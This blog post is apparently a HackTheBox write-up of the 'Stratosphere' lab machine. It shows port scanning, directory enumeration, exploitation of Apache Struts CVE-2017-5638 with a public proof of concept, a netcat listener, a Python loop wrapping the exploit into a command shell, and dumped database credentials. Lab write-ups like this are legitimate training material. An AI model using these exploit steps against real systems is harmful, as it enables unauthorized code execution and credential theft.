---
layout: post
title:  "Stratosphere"
date:   2018-09-04 14:50:00 +0100
categories: hackthebox
---
* TOC
{:toc}

# Introduction
Stratosphere

# Service Detection
First things first, let's see what services we can find on this box

{% highlight plaintext %}
# Nmap 7.70 scan initiated Thu Jul 26 13:24:35 2018 as: nmap -sC -sV -oA nmap/stratosphere 10.10.10.64
Nmap scan report for 10.10.10.64                                                                                                                                                                                   
Host is up (0.040s latency).                                                                                                                                                                                       
Not shown: 997 filtered ports                                                                                                                                                                                      
PORT     STATE SERVICE    VERSION                                                                                                                                                                                  
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                     
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)                                                                                                                                                     
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)                                                                                                                                                    
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)                                                                                                                                                  
80/tcp   open  http                                                                                                                                                                                                
| fingerprint-strings:                                                                                                                                                                                             
|   Kerberos, LDAPSearchReq, LPDString, SMBProgNeg, SSLSessionReq, TLSSessionReq:                                                                                                                                  
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:39 GMT                                                                                                                                                                          
|     Connection: close                                                                                                                                                                                            
|   LANDesk-RC, LDAPBindReq, NCP, NotesRPC, SIPOptions, TerminalServer:                                                                                                                                            
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:40 GMT                                                                                                                                                                          
|_    Connection: close                                                                                                                                                                                            
| http-methods:                                                                                                                                                                                                    
|_  Potentially risky methods: PUT DELETE                                                                                                                                                                          
|_http-title: Stratosphere                                                                                                                                                                                         
8080/tcp open  http-proxy                                                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                                                             
|   Help, Kerberos, LPDString, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:                                                                                                                                 
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:39 GMT                                                                                                                                                                          
|     Connection: close                                                                                                                                                                                            
|   LANDesk-RC, LDAPBindReq, LDAPSearchReq, SIPOptions, TerminalServer:                                                                                                                                            
|     HTTP/1.1 400                                                                                                                                                                                                 
|     Transfer-Encoding: chunked                                                                                                                                                                                   
|     Date: Thu, 26 Jul 2018 12:25:40 GMT                                                                                                                                                                          
|_    Connection: close                                                                                                                                                                                            
| http-methods:                                                                                                                                                                                                    
|_  Potentially risky methods: PUT DELETE                                                                                                                                                                          
|_http-title: Stratosphere                                                                                    
{% endhighlight %}

OK, we have ssh, http on 80 and 8080, although nmap had some trouble identifying them

# Website
![]({{ "assets/stratosphere/1.png" | absolute_url }})

Snazzy looking website. Looking around, we find it is underconstruction
## Enumeration

While most people use GoBuster, I like dirsearch <https://github.com/maurosoria/dirsearch> as it gives you a percentage count

`/opt/dirsearch/dirsearch.py -u http://10.10.10.64/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html --plain-text-report=dirbus_80`

{% highlight plaintext %}
 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: html | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-18-09-04_15-14-46.log

Target: http://10.10.10.64/

[15:14:46] Starting: 
[15:14:46] 200 -    2KB - /
[15:18:53] 302 -    0B  - /manager  ->  /manager/
[15:18:53] 302 -    0B  - /Monitoring  ->  /Monitoring/
{% endhighlight %}

Let's see what's in the manager directory. It's password protected.

Monitoring redirects us to the URL `http://10.10.10.64/Monitoring/example/Welcome.action`

A quick google for urls ending in Action, mentions Struts. Struts has some pretty well documented exploits, so let's try some
## Struts Attack

We start with the CVE-2017-5638 that equifax were pwned by. A quick google gives us some POC code <https://github.com/mazen160/struts-pwn>

{% highlight plaintext %}
root@kali:~/HTB/stratosphere/struts/struts-pwn# ./struts-pwn.py -u http://10.10.10.64/Monitoring/example/Register.action -c id

[*] URL: http://10.10.10.64/Monitoring/example/Register.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
{% endhighlight %}

We have command execution. Now to get a reverse shell

Listen on port 9001
`nc -lvnp 9001`

Then lets send a reverse shell command <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet> via our struts exploit

Nothing seems to work, so I created a simple python script to loop the struts exploit and give me a kinda-shell

{% highlight python %}
#!/usr/bin/python

import os

while True:
    cmd = raw_input('enter command : ')
    os.system('./struts-pwn.py --url http://10.10.10.64:8080/Monitoring/example/Register.action -c "{}"'.format(cmd))
{% endhighlight %}


Within our working directory there is a db_connect file with some credentials

{% highlight plaintext %}
enter command : cat db_connect

[*] URL: http://10.10.10.64:8080/Monitoring/example/Register.action
[*] CMD: cat db_connect
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ('Connection broken: IncompleteRead(0 bytes read)', IncompleteRead(0 bytes read))
Note: Server Connection Closed Prematurely

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

[%] Done.
{% endhighlight %}


